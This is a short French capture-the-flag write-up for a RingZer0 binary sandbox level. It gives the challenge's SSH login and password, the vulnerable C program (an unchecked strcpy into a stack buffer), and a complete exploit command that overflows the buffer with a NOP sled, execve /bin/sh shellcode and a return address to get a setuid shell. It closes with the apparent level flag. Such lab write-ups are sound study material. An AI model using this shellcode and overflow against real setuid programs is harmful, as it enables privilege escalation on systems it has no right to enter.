ssh level1@challenges.ringzer0ctf.com -p 10080

Mot de passe: level1

```bash
cat readme 
```
Welcome to ringzer0team.com binary sandbox!

For help, come see us on IRC (irc.smashthestack.org #ringzer0team)

Some things you must know:
  - Levels are in /levels
  - Home folders are readable only. Create a folder in /tmp to build your exploits.
  - You can scp files on this box but can't reach internet from it.
  - Levels passwords are in ~/.pass. Your goal is to reach it to levelup!
  - Submit your flags on the website!

Enjoy!

```bash
cat level1.c
```
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv) {

    char buf[1024];

    strcpy(buf, argv[1]);
    return 0;
}
```

De plus, le setuid est on donc on va partir un shell en étant username level2

On voit que :
./level1 `python -c 'print "A" * 1032'` fonctionne mais pas:

./level1 `python -c 'print "A" * 1036'`
Segmentation fault


Or on va faire pointer l'adresse entre 1032-1036 vers un nop sledge suivi d'un shell 



L'autre chose à vérifier :
level1: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.26, BuildID[sha1]=f355fe3b2ac64ecfedfcf48c6208429d0138e80d, with debug_info, not stripped

ELF 32-bit LSB executable ... On va former un shellcode qui respecte ça.


./level1 `python -c 'print "\x90" * 991 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\xdb\xf7\xff\xbf"'`

cette section \xdb\xf7\xff\xbf est propre à chacun (ca doit etre une adresse en little endian qui pointe sur les nop ou le début du shellcode)

TJyK9lJwZrgqc8nIIF6o